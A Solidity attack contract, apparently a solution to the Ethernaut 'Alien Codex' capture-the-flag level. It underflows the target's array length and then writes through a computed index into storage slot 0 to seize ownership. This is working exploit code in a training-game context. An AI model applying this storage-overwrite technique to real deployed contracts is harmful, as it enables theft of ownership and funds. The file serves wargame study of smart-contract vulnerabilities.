// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IAlienCodex {
  function make_contact()external ;
  function record(bytes32 _content)external;
  function retract()external;
  function revise(uint i, bytes32 _content)external;
}

contract Attack  {

    address alien;
    constructor(address _alien)public {
        alien =_alien;
    }
    //owner of target will store in slot 0 
    function attack()public{
      IAlienCodex(alien).make_contact();
      //set last index by underflow
      IAlienCodex(alien).retract();
      //attack by buffer overflow(last_index + 1 => slot 0)
      // https://blog.dixitaditya.com/ethernaut-level-19-alien-codex
      uint i = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
      bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));
      IAlienCodex(alien).revise(i,newOwner);
    }
}